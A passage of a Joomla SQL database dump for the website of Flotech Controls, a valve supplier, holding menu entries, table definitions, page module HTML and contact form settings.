(121, 'mainmenu', 'Mining', 'mining', '', 'application-sectors/mining', 'index.php?option=com_content&view=article&id=11', 'component', 1, 105, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Red Valve | Wey | Valvtechnologies | Knife gate valve | Ball valve | Pinch valve | Check Valve | Non return valve | Valves for abrasive applications | Valves for corrosive applications | Bi-directional valve | Zero leakage valve | Tight shut off valve | Slurry valves | Tailings Disposal valves","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Red Valve,Wey,Valvtechnologies,Knife gate valve,Ball valve,Pinch valve,Check Valve,Non return valve,Valves for abrasive applications\\r\\n,Valves for corrosive applications,Bi-directional valve,Zero leakage valve,Tight shut off valve,Slurry valves,Tailings Disposal valves\\r\\n,High pressure acid leaching valves,Autoclave acid injection valves,High pressure process product transportation lines\\r\\n","robots":"","secure":0}', 76, 77, 0, '*', 0),
(122, 'mainmenu', 'Oil and Gas', 'oil-and-gas', '', 'application-sectors/oil-and-gas', 'index.php?option=com_content&view=article&id=13', 'component', 1, 105, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Birkett | Copes Vulcan | Valvtechnologies | SOR | Safety relief valve | Pressure relief valve | Pressure reducing valve | Ball valve | Trunnion mounted ball valve","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Birkett,Copes Vulcan,Valvtechnologies,SOR,Safety relief valve,Pressure relief valve,Pressure reducing valve,Ball valve,Trunnion mounted ball valve\\r\\n,Zero leakage,Non return valves,Valves for mole sieves,HIPPS systems,Compressor kick back valves,Water treatment valves,Isolation valves,Control valves","robots":"","secure":0}', 78, 79, 0, '*', 0),
(123, 'main', 'COM_SEXYCONTACTFORM_MENU', 'com-sexycontactform-menu', '', 'com-sexycontactform-menu', 'index.php?option=com_sexycontactform', 'component', 0, 1, 1, 10009, 0, '0000-00-00 00:00:00', 0, 1, 'components/com_sexycontactform/assets/images/project_16.png', 0, '', 83, 84, 0, '', 1),
(124, 'main', 'COM_FOXCONTACT_MENU', 'com-foxcontact-menu', '', 'com-foxcontact-menu', 'index.php?option=com_foxcontact', 'component', 0, 1, 1, 10012, 0, '0000-00-00 00:00:00', 0, 1, 'class:component', 0, '', 85, 86, 0, '', 1),
(125, 'mainmenu', 'MTS', 'mts', '', 'products/mts', 'index.php?option=com_content&view=article&id=14', 'component', 1, 104, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"MTS | Plug Valve | Isolation valve | Control valve | Seawater reverse osmosis valves | Sulfate removal systems | Industrial water reclamation | Desalination | Oil and Gas","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"MTS,Plug Valve,Isolation valve,Control valve,Seawater reverse osmosis valves,Sulfate removal systems,Industrial water reclamation,Desalination,Oil and Gas\\r\\n","robots":"","secure":0}', 66, 67, 0, '*', 0),
(126, 'mainmenu', 'Copes - Vulcan', 'copes', '', 'products/copes', 'index.php?option=com_content&view=article&id=15', 'component', 1, 104, 2, 22, 0, '0000-00-00 00:00:00', 0, 1, '', 12, '{"show_title":"","link_titles":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_vote":"","show_tags":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_hits":"","show_noauth":"","urls_position":"","menu-anchor_title":"","menu-anchor_css":"","menu_image":"","menu_text":1,"page_title":"Copes Vulcan | SPX company | Pressure reducing valve | High Pressure | High Temperature | Severe service control valve | Turbine bypass | Attemporator | Steam conditioning valve | Control Valve","show_page_heading":0,"page_heading":"","pageclass_sfx":"","menu-meta_description":"Flotech Controls has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours.","menu-meta_keywords":"Copes Vulcan,SPX company,Pressure reducing valve,High Pressure,High Temperature,Severe service control valve,Turbine bypass,Attemporator,Steam conditioning valve,Control Valve\\r\\n,Modulating valve,Flow control applications,Desuperheater,Control valve trim types,Compressor kick back valves,Oil and gas control valve applications\\r\\n,Power control valve applications,aCritical pressure drop\\r\\n","robots":"","secure":0}', 68, 69, 0, '*', 0),
(128, 'main', 'COM_UNITEREVOLUTION', 'com-uniterevolution', '', 'com-uniterevolution', 'index.php?option=com_uniterevolution', 'component', 0, 1, 1, 10015, 0, '0000-00-00 00:00:00', 0, 1, 'components/com_uniterevolution/assets/images/icon-16-revolution.png', 0, '', 87, 88, 0, '', 1),
(129, 'main', 'JCE', 'jce', '', 'jce', 'index.php?option=com_jce', 'component', 0, 1, 1, 10004, 0, '0000-00-00 00:00:00', 0, 1, 'components/com_jce/media/img/menu/logo.png', 0, '', 89, 98, 0, '', 1),
(130, 'main', 'WF_MENU_CPANEL', 'wf-menu-cpanel', '', 'jce/wf-menu-cpanel', 'index.php?option=com_jce', 'component', 0, 129, 2, 10004, 0, '0000-00-00 00:00:00', 0, 1, 'components/com_jce/media/img/menu/jce-cpanel.png', 0, '', 90, 91, 0, '', 1),
(131, 'main', 'WF_MENU_CONFIG', 'wf-menu-config', '', 'jce/wf-menu-config', 'index.php?option=com_jce&view=config', 'component', 0, 129, 2, 10004, 0, '0000-00-00 00:00:00', 0, 1, 'components/com_jce/media/img/menu/jce-config.png', 0, '', 92, 93, 0, '', 1),
(132, 'main', 'WF_MENU_PROFILES', 'wf-menu-profiles', '', 'jce/wf-menu-profiles', 'index.php?option=com_jce&view=profiles', 'component', 0, 129, 2, 10004, 0, '0000-00-00 00:00:00', 0, 1, 'components/com_jce/media/img/menu/jce-profiles.png', 0, '', 94, 95, 0, '', 1),
(133, 'main', 'WF_MENU_INSTALL', 'wf-menu-install', '', 'jce/wf-menu-install', 'index.php?option=com_jce&view=installer', 'component', 0, 129, 2, 10004, 0, '0000-00-00 00:00:00', 0, 1, 'components/com_jce/media/img/menu/jce-install.png', 0, '', 96, 97, 0, '', 1);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_menu_types`
--

CREATE TABLE IF NOT EXISTS `j6kpf_menu_types` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `menutype` varchar(24) NOT NULL,
  `title` varchar(48) NOT NULL,
  `description` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_menutype` (`menutype`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `j6kpf_menu_types`
--

INSERT INTO `j6kpf_menu_types` (`id`, `menutype`, `title`, `description`) VALUES
(1, 'mainmenu', 'Main Menu', 'The main menu for the site');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_messages`
--

CREATE TABLE IF NOT EXISTS `j6kpf_messages` (
  `message_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id_from` int(10) unsigned NOT NULL DEFAULT '0',
  `user_id_to` int(10) unsigned NOT NULL DEFAULT '0',
  `folder_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `date_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `state` tinyint(1) NOT NULL DEFAULT '0',
  `priority` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `subject` varchar(255) NOT NULL DEFAULT '',
  `message` text NOT NULL,
  PRIMARY KEY (`message_id`),
  KEY `useridto_state` (`user_id_to`,`state`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_messages_cfg`
--

CREATE TABLE IF NOT EXISTS `j6kpf_messages_cfg` (
  `user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `cfg_name` varchar(100) NOT NULL DEFAULT '',
  `cfg_value` varchar(255) NOT NULL DEFAULT '',
  UNIQUE KEY `idx_user_var_name` (`user_id`,`cfg_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_modules`
--

CREATE TABLE IF NOT EXISTS `j6kpf_modules` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL DEFAULT '',
  `note` varchar(255) NOT NULL DEFAULT '',
  `content` text NOT NULL,
  `ordering` int(11) NOT NULL DEFAULT '0',
  `position` varchar(50) NOT NULL DEFAULT '',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `module` varchar(50) DEFAULT NULL,
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `showtitle` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `params` text NOT NULL,
  `client_id` tinyint(4) NOT NULL DEFAULT '0',
  `language` char(7) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `published` (`published`,`access`),
  KEY `newsfeeds` (`module`,`published`),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=115 ;

--
-- Dumping data for table `j6kpf_modules`
--

INSERT INTO `j6kpf_modules` (`id`, `title`, `note`, `content`, `ordering`, `position`, `checked_out`, `checked_out_time`, `publish_up`, `publish_down`, `published`, `module`, `access`, `showtitle`, `params`, `client_id`, `language`) VALUES
(1, 'Main Menu', '', '', 1, 'position-menu', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, 'mod_menu', 1, 1, '{"menutype":"mainmenu","base":"","startLevel":"1","endLevel":"0","showAllChildren":"1","tag_id":"","class_sfx":"","window_open":"","layout":"_:default","moduleclass_sfx":"_menu","cache":"1","cache_time":"900","cachemode":"itemid","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(2, 'Login', '', '', 1, 'login', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_login', 1, 1, '', 1, '*'),
(3, 'Popular Articles', '', '', 3, 'cpanel', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_popular', 3, 1, '{"count":"5","catid":"","user_id":"0","layout":"_:default","moduleclass_sfx":"","cache":"0","automatic_title":"1"}', 1, '*'),
(4, 'Recently Added Articles', '', '', 4, 'cpanel', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_latest', 3, 1, '{"count":"5","ordering":"c_dsc","catid":"","user_id":"0","layout":"_:default","moduleclass_sfx":"","cache":"0","automatic_title":"1"}', 1, '*'),
(8, 'Toolbar', '', '', 1, 'toolbar', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_toolbar', 3, 1, '', 1, '*'),
(9, 'Quick Icons', '', '', 1, 'icon', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_quickicon', 3, 1, '', 1, '*'),
(10, 'Logged-in Users', '', '', 2, 'cpanel', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_logged', 3, 1, '{"count":"5","name":"1","layout":"_:default","moduleclass_sfx":"","cache":"0","automatic_title":"1"}', 1, '*'),
(12, 'Admin Menu', '', '', 1, 'menu', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_menu', 3, 1, '{"layout":"","moduleclass_sfx":"","shownew":"1","showhelp":"1","cache":"0"}', 1, '*'),
(13, 'Admin Submenu', '', '', 1, 'submenu', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_submenu', 3, 1, '', 1, '*'),
(14, 'User Status', '', '', 2, 'status', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_status', 3, 1, '', 1, '*'),
(15, 'Title', '', '', 1, 'title', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_title', 3, 1, '', 1, '*'),
(16, 'Login Form', '', '', 7, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, 'mod_login', 1, 1, '{"greeting":"1","name":"0"}', 0, '*'),
(17, 'Breadcrumbs', '', '', 1, 'position-2', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_breadcrumbs', 1, 1, '{"showHere":"1","showHome":"1","homeText":"Home","showLast":"1","separator":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"itemid","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(79, 'Multilanguage status', '', '', 1, 'status', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, 'mod_multilangstatus', 3, 1, '{"layout":"_:default","moduleclass_sfx":"","cache":"0"}', 1, '*'),
(86, 'Joomla Version', '', '', 1, 'footer', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_version', 3, 1, '{"format":"short","product":"1","layout":"_:default","moduleclass_sfx":"","cache":"0"}', 1, '*'),
(87, 'banner', '', '<img src="images/template_images/bnnr1.jpg" style="vertical-align: middle;" />', 1, 'position-0', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, 'mod_custom', 1, 0, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" home_banner","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(88, 'introduction', '', '<p id="introduction_text"><em>Flotech Controls</em> has provided valve and instrumentation solutions to all industry sectors in Australia, New Zealand and the Asia Pacific Region since 1991. Cost-effective solution to control valve and isolating zero leakage problems where the failure of the critical service valves are cutting production, increasing downtime and lost man hours. [ <span style="color: #7e7e93; font-size: 12pt;"><a href="/about-us"><span style="color: #7e7e93; font-size:17px;">read more</span></a></span> ]</p>\r\n<div id="undrline">&nbsp;</div>', 1, 'position-1', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 1, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(89, 'home Page main boxes', '', '\r\n<div id="home_main_box" style="width: 980px;">\r\n<div id="nextbox1"><a href="/application-sectors/mining"><img alt="home-1-mining" src="images/newimages/homepageboxes/home-1-mining.jpg" height="68" width="209" /></a>\r\n<h3><a href="/application-sectors/mining">Mining</a></h3>\r\nCarefully selected valves for high pressure product lines, tailing disposal systems, high pressure acid leaching and many applications through the process plant.[<span style="color: #ff0000;"><a href="/application-sectors/mining"><span style="color: #ff0000;">read more</span></a></span>]</div>\r\n<div id="nextbox2"><a href="/application-sectors/oil-and-gas"><img alt="home-2-oil-and-gas" src="images/newimages/homepageboxes/home-2-oil-and-gas.jpg" height="68" width="209" /></a>\r\n<h3><a href="/application-sectors/oil-and-gas">Oil and Gas</a></h3>\r\nSafety relief valves, metal seated isolation valves. Designed to meet tough process conditions such as temperature, pressure, high solids or high cycling. [<span style="color: #ff0000;"><a href="/application-sectors/oil-and-gas"><span style="color: #ff0000;">read more</span></a></span>]</div>\r\n<div id="nextbox3"><a href="/application-sectors/water"><img alt="home-3-water" src="images/newimages/homepageboxes/home-3-water.jpg" height="68" width="209" /></a>\r\n<h3><a href="/application-sectors/water">Water</a></h3>\r\nValve solutions for pumping stations, wastewater treatment plants, desalination, reservoir mixing systems, aeration systems and stormwater/ effluent outfalls.[<span style="color: #ff0000;"><a href="/application-sectors/water"><span style="color: #ff0000;">read more</span></a></span>]</div>\r\n<div id="nextbox4"><a href="/application-sectors/power"><img alt="home-4-power" src="images/newimages/homepageboxes/home-4-power.jpg" height="68" width="209" /></a>\r\n<h3><a href="/application-sectors/power">Power</a></h3>\r\nExpertise in severe service control and isolation solutions for high pressure, high temperature applications. Zero leakage isolation eliminates wasted fuel costs.[<span style="color: #ff0000;"><a href="/application-sectors/power"><span style="color: #ff0000;">read more</span></a></span>]</div>\r\n</div>', 1, 'position-1', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(90, 'logos - homepage', '', '<div style="text-align: center;"><a href="/products/valvtechnologies"><img alt="1.valve-technologies" src="images/template_images/logos/1.valve-technologies.png" height="27" width="99" /></a> <a href="/products/birkett"><img alt="2.birkett" src="images/template_images/logos/2.birkett.png" height="27" width="135" /></a> <a href="/products/tideflex"><img alt="3.tideflex" src="images/template_images/logos/3.tideflex.png" height="27" width="76" /></a>&nbsp; <a href="/products/red-valve"><img alt="5.rv" src="images/template_images/logos/5.rv.png" height="27" width="36" /></a> <a href="/products/noreva"><img alt="7.noreva" src="images/template_images/logos/7.noreva.png" height="27" width="88" /></a> <a href="/products/wey"><img alt="4.-wey" src="images/template_images/logos/4.-wey.png" height="27" width="55" /></a> <a href="/products/mts"><img alt="9.mts" src="images/template_images/logos/9.mts.png" height="27" width="73" /></a> <a href="/products/sor"><img alt="10.sor" src="images/template_images/logos/10.sor.png" height="27" width="49" /></a> <a href="/products/copes"><img alt="2" src="images/newimages/copes/2.gif" height="28" width="165" /></a></div>', 1, 'logo_layout', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":" logo_homepage","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(91, 'footer_menu', '', '', 1, 'position-9', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, 'mod_menu', 1, 0, '{"menutype":"mainmenu","base":"","startLevel":"1","endLevel":"0","showAllChildren":"0","tag_id":"","class_sfx":"","window_open":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"itemid","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(92, 'footer_menu', '', '', 1, 'position-10', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, 'mod_menu', 1, 0, '{"menutype":"mainmenu","base":"","startLevel":"1","endLevel":"0","showAllChildren":"0","tag_id":"","class_sfx":"","window_open":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"itemid","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(93, 'footer_menu', '', '', 1, 'position-11', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, 'mod_menu', 1, 0, '{"menutype":"mainmenu","base":"","startLevel":"1","endLevel":"0","showAllChildren":"0","tag_id":"","class_sfx":"","window_open":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"itemid","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(94, 'footer_info', '', '<p style="float: left; text-align: left; padding-left:10px;">Copyright&nbsp;© Flotech Controls Pty Ltd</p>\r\n<span style="float: right; text-align: right; padding-right:10px; color:#3A3A3A;">Development Sydney by <a style="color:#3A3A3A;" target="_blank" href="http://www.binarix.com">Binarix</a></span>', 1, 'position-14', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(95, 'Questions (Right Hand Side)', '', '<p><img alt="enquiry" src="images/template_images/enquiry.png" height="34" width="42" /> <strong>Questions?</strong></p>\r\n<p>If you have any questions or enquiries, Flotech''s here to help. <a href="/contact-us">Contact us »</a></p>\r\n\r\n', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(96, 'Responsive Menu', '', '', 1, 'position-menu', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_responsivemenu', 1, 0, '{"menutype":"mainmenu","startLevel":"1","endLevel":"0","subItemWidth":"200","showAllChildren":"1","MenuBG":"#220E0F","MenuBG2":"220E0F","MenuBG3":"220E0F","MenuHoverBGClr":"151515","outlineClr":"151515","linksClr":"151515","linksHoverClr":"151515","jQuery":"1","class_sfx":"","moduleclass_sfx":" _responsive_menu","cache":"1","cache_time":"900","cachemode":"itemid","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(97, 'Noreva Page (Right Hand Side) ', '', '<p><img alt="3" src="images/products/noreva/3.jpg" height="202" width="336" /></p>\r\n<p>&nbsp;</p>\r\n<p><img alt="4" src="images/products/noreva/4.jpg" height="218" width="291" /></p>\r\n<p>&nbsp;</p>\r\n<p><img alt="45" src="images/products/noreva/45.jpg" height="198" width="256" /></p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(98, 'Contact us Form', '', '', 1, 'contactusform', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 0, 'mod_sexycontactform', 1, 0, '{"form_id":"2","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(99, 'RED VALVE (right hand side)', '', '<p><img alt="1" src="images/newimages/redvalve/1.jpg" height="144" width="122" /></p>\r\n<p><img alt="2" src="images/newimages/redvalve/2.jpg" height="248" width="126" /></p>\r\n<p><img alt="4" src="images/newimages/redvalve/4.jpg" height="186" width="132" /></p>\r\n<p><img alt="7" src="images/newimages/redvalve/7.jpg" height="123" width="144" /></p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(100, 'tideflex (right handside)', '', '<p><img alt="1" src="images/newimages/tideflex/1.jpg" height="172" width="231" /></p>\r\n<p><img alt="2" src="images/newimages/tideflex/2.jpg" height="283" width="230" /></p>\r\n<p><img alt="3" src="images/newimages/tideflex/3.jpg" height="160" width="233" /></p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(101, 'Wey (right hand side)', '', '<p><img alt="1" src="images/newimages/wey/1.png" height="250" width="122" /></p>\r\n<p><img alt="3" src="images/newimages/wey/3.png" height="219" width="230" /></p>\r\n<p><img alt="2" src="images/newimages/wey/2.png" height="237" width="102" /></p>\r\n<p><img alt="wey-seethru" src="images/wey/wey-seethru.jpg" height="230" width="230" /></p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(103, 'Contact Us', '', '', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_foxcontact', 1, 0, '{"to_address":"info@flotechcontrols.com","cc_address":"","bcc_address":"","email_subject":"Information request from your website","jmessenger_user":"0","page_subheading":"Enquiry Form","form__width":{"text":"","select":"auto"},"customhtml0":"If you want more information fill in this form. You will be contacted as soon as possible.<br \\/>Please fill in all <b>required fields<\\/b>.","customhtml0display":"1","customhtml0order":"-1000","customhtml1":"","customhtml1display":"1","customhtml1order":"1000","labelsdisplay":"1","form_layout":"stacked","labels__width":{"text":"230","select":"px"},"sender0":"First Name","sender0display":"2","sender0order":"5","sender1":"Email address","sender1display":"2","sender1order":"20","sender1isemail":"1","text0":"Last Name","text0display":"2","text0order":"10","text1":"Company","text1display":"1","text1order":"15","text2":"Contact Number","text2display":"2","text2order":"25","text3":"","text3display":"0","text3order":"30","text4":"","text4display":"0","text4order":"35","text5":"","text5display":"0","text5order":"40","text6":"","text6display":"0","text6order":"45","text7":"","text7display":"0","text7order":"50","text8":"","text8display":"0","text8order":"55","text9":"","text9display":"0","text9order":"60","text__width":{"text":"85","select":"%"},"dropdown0":"Industry","dropdown0display":"2","dropdown0values":"Mining,Oil and Gas, Power, Water, Other","dropdown0order":"65","dropdown1":"Product","dropdown1display":"2","dropdown1values":"Noreva, Valvtechnologies, Wey, Tideflex, Red Valve, Copes, SOR, Other","dropdown1order":"70","dropdown2":"","dropdown2display":"0","dropdown2values":"","dropdown2order":"75","dropdown__width":{"text":"85","select":"%"},"textarea0":"Comments","textarea0display":"2","textarea0order":"80","textarea1":"","textarea1display":"0","textarea1order":"85","textarea2":"","textarea2display":"0","textarea2order":"90","textarea__width":{"text":"85","select":"%"},"textarea__height":{"text":"180","select":"px"},"checkbox0":"I agree with your terms and conditions","checkbox0display":"0","checkbox0order":"95","checkbox1":"","checkbox1display":"0","checkbox1order":"100","checkbox2":"","checkbox2display":"0","checkbox2order":"105","checkbox3":"","checkbox3display":"0","checkbox3order":"110","checkbox4":"","checkbox4display":"0","checkbox4order":"115","uploaddisplay":"0","uploadmethod":"1","upload":"Select files to attach","uploadmax_file_size":"102400","upload_filter":"1","upload_audio":"0","upload_video":"0","upload_images":"1","upload_documents":"1","upload_archives":"1","submittext":"Submit","submittype":"0","submiticon":"tick-circle.png","submitimage":"default.png","resetbutton":"0","resettext":"Reset","resettype":"0","reseticon":"-1","resetimage":"-1","email_sent_action":"0","email_sent_text":"Thank you. Your message has been received. One of our sales engineers will be contacting you shortly.","email_sent_textdisplay":"1","email_sent_page":"101","copy_to_submitter":"1","email_copy_subject":"Thank you for contacting us","email_copy_text":"Thank you. Your message has been received. One of our sales engineers will be contacting you 